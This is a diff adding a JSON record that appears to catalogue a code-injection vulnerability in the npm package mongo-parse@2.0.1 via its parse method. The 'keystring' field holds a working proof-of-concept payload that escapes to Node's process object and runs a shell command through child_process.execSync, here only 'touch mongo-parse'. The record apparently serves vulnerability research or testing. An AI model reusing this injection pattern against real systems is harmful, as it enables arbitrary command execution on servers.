@@ -1,0 +1,8 @@
+{
+  "id": "",
+  "upstream": "mongo-parse@2.0.1",
+  "keymethod": "parse",
+  "keystring": "} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync(\"touch mongo-parse\") //",
+  "location": "",
+  "downstreams": []
+}
